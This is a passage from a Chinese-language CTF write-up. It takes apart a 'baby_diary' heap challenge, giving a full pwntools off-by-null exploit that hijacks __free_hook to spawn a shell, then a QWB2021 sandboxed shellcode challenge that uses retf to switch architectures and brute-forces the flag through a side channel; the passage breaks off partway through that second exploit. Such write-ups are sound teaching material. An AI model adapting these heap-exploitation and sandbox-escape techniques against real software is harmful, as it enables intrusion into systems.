class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *chunkptr; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunknum &lt;= <span class="number">0x18</span> &amp;&amp; chunklists[chunknum] )</span><br><span class="line">  &#123;</span><br><span class="line">    chunkptr = chunklists[chunknum];</span><br><span class="line">    readsize[chunknum] = readnum;</span><br><span class="line">    <span class="keyword">if</span> ( readnum )</span><br><span class="line">      chunkptr[readnum + <span class="number">1</span>] = (chunkptr[readnum + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) + sub_146E(chunknum);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">sub_146E</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> chunknum)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunknum &gt; <span class="number">0x18</span> || !chunklists[chunknum] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; readsize[chunknum]; ++i )</span><br><span class="line">    v3 += (<span class="type">unsigned</span> __int8)chunklists[chunknum][i];</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    v3 = (v3 &gt;&gt; <span class="number">4</span>) + (v3 &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数会在空字符的后面再追加一个校验码，当输入的数据全为空字符时，校验码为<code>(chunkptr[readnum + 1] &amp; 0xF0)</code>，会导致off-by-null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  result = !sub_15DF(num);</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, chunklists[num]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">sub_15DF</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">24</span> || !chunklists[num] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  size = readsize[num];</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = chunklists[num][size + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> ((v2 - (<span class="type">unsigned</span> __int8)sub_146E(num)) &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_146E</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> chunknum)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunknum &gt; <span class="number">0x18</span> || !chunklists[chunknum] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; readsize[chunknum]; ++i )</span><br><span class="line">    v3 += (<span class="type">unsigned</span> __int8)chunklists[chunknum][i];</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    v3 = (v3 &gt;&gt; <span class="number">4</span>) + (v3 &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show功能在输出之前，会有一个检查，检查通过才输出。</p><p>dele功能正常。</p><p>这题是off-by-null的另一种考查方式，对于堆风水的构造要求更高。</p><p>高版本的off-by-null是利用smallbin和largebin的残留指针构造出fakechunk-&gt;fd-&gt;bk&#x3D;&#x3D;fakechunk,fakechunk-&gt;bk-&gt;fd&#x3D;&#x3D;fakechunk，来绕过unlink的检查。一般的off-by-null只会在末尾加\x00，但这一题除了末尾添\x00外，还会添一个校验码</p><p>下面是一般情况下的off-by-null的构造方式的开头  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;chunk_&#x27;</span> + <span class="built_in">str</span>(<span class="number">64</span>+i) + <span class="string">&#x27;n&#x27;</span>) <span class="comment">#用于填充tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x5a8</span>,<span class="string">&#x27;pad&#x27;</span>) <span class="comment">#使堆地址对齐</span></span><br><span class="line">add(<span class="number">0x5e0</span>,<span class="string">&#x27;chunk_72&#x27;</span> + <span class="string">&#x27;n&#x27;</span>) <span class="comment">#largebin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;chunk_73&#x27;</span> + <span class="string">&#x27;n&#x27;</span>) <span class="comment">#防止largebin被topchunk合并</span></span><br><span class="line">delete(<span class="number">72</span>) <span class="comment">#dele掉0x5e0的chunk，进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x618</span>,<span class="string">&#x27;chunk_72&#x27;</span> + <span class="string">&#x27;n&#x27;</span>) <span class="comment">#申请一个大于0x5e0的chunk，使其进入largebin，堆上留下了残留指针</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xe1</span>)+p8(<span class="number">0x90</span>)) <span class="comment">#chunk0 从largebin切割，在其中伪造一个0xe1的chunk，将fakechunk的fd指向chunk3</span></span><br><span class="line"><span class="comment">#在这里，我们除了要伪造fakechunk的size外，还要修改fd的末尾字节，如果使用这种方式来解决本题是行不通的，假设原本的fd为0x55abcdefgh10,将末尾修改为0x90后，fd就会变为0x55abcdgX0090,写入的校验码会破坏堆地址</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>并且fakechunk的size也只能为0x100的整数倍</p><p>伪造好的整体结构如下</p><p><a href="https://imgtu.com/i/jjO8yt"><img src="https://s1.ax1x.com/2022/07/24/jjO8yt.png" alt="jjO8yt.png"></a></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;8.140.114.72&#x27;,1399)</span></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">elf=ELF(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size-<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x898</span>,<span class="string">&#x27;pad&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x6f8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#9</span></span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x700</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0x48</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">10</span>)</span><br><span class="line">    dele(<span class="number">14</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x38</span>,p64(<span class="number">0xd0</span>)) <span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#18</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">18</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x38</span>,p64(<span class="number">0xb</span>)+p64(<span class="number">0x201</span>))<span class="comment">#19</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">12</span>)</span><br><span class="line">    dele(<span class="number">19</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#19</span></span><br><span class="line">    dele(<span class="number">17</span>)</span><br><span class="line">    add(<span class="number">0x38</span>,p8(<span class="number">0</span>)*<span class="number">0x37</span>) <span class="comment">#17</span></span><br><span class="line">    dele(<span class="number">17</span>)</span><br><span class="line">    add(<span class="number">0x38</span>,p8(<span class="number">0</span>)*<span class="number">0x2f</span>+p8(<span class="number">0x20</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    dele(<span class="number">10</span>)<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    show(<span class="number">11</span>)</span><br><span class="line">    libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x41</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x38</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">    dele(<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    io=process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><h2 id="0x9-QWB2021-shellcode【retf切换架构，侧信道爆破flag】"><a href="#0x9-QWB2021-shellcode【retf切换架构，侧信道爆破flag】" class="headerlink" title="0x9.QWB2021 shellcode【retf切换架构，侧信道爆破flag】"></a>0x9.QWB2021 shellcode【retf切换架构，侧信道爆破flag】</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> ......</span><br><span class="line">  v45 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = (<span class="type">unsigned</span> __int64)&amp;v10;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="type">unsigned</span> __int64)arg3, v2);</span><br><span class="line">  v4 = (<span class="type">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[(<span class="type">int</span>)v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[(<span class="type">int</span>)v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v4)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开了沙箱，然后读取shellcode，shellcode必须是可见字符。</p><p>查看沙箱</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>并没有限制架构，orw只有r。</p><p>fstat在64位下的调用号位5，而32位下系统调用号5是open，这样orw就只剩w没有了</p><p>蓝帽杯有一道题目考察的是shellcode盲注，也是没有w，通过盲注将flag爆破出来，这个思路也同样适用于本题，这样一来orw就都凑齐了</p><p>再有就是，从64位切换到32位需要使用retf这个指令，这个指令会跳转到[rsp]继续执行指令，将[rsp+8]放到CS寄存器，[rsp+8]为0x23时，切换到32位，为0x33时，切换到64位，整体思路为：</p><p>1.发送第一段shellcode，这段shellcode首先实现mmap功能，开辟一段内存方便64位和32位shellcode同时操作；然后实现read功能，用来读取第二段shellcode到mmap出来的内存中；最后执行retf指令切换到32位模式，并跳转到mmap出的那块内存执行第二段shellcode。</p><p>2.第二段shellcode在32位模式下执行，首先执行open系统调用，打开flag文件，然后执行retf指令，切换为64位模式，并跳转到一个地址执行剩下的shellcode，这个地址需要事先计算好；跳转过去之后执行的shellcode，执行read调用，将flag的值读取到栈顶，最后进入一个爆破shellcode，按字节爆破flag。</p><p>第一段shellcode需要为可见字符串，可以使用ae64或者alpha3来进行编码，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io=process(&#x27;./shellcode&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">io,idx,<span class="built_in">chr</span></span>):</span><br><span class="line">    shellcode_mmap=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*mmap(0x20000,0x1000,7,34,0,0)*/</span></span><br><span class="line"><span class="string">        mov r9d, 0</span></span><br><span class="line"><span class="string">        mov r8d, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">        mov r10d, 0x22</span></span><br><span class="line"><span class="string">        mov edx, 7</span></span><br><span class="line"><span class="string">        mov esi, 0x1000</span></span><br><span class="line"><span class="string">        mov edi, 0x20000</span></span><br><span class="line"><span class="string">        mov eax, 9</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_read=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*read(0,0x20000,0x70)*/</span></span><br><span class="line"><span class="string">        push 0x20000</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0x70</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        xor rdi,rdi</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_read_flag_x64=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x30</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    brute:</span></span><br><span class="line"><span class="string">        mov al,[rsp+%d]</span></span><br><span class="line"><span class="string">        cmp al,%d</span></span><br><span class="line"><span class="string">        jnz die</span></span><br><span class="line"><span class="string">        jmp brute</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    die:</span></span><br><span class="line"><span class="string">        mov al,[0]</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(idx,<span class="built_in">chr</span>)</span><br><span class="line"></span><br><span class="line">    shellcode_retfq_to_x86=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, 0x2300020000</span></span><br><span class="line"><span class="string">        push 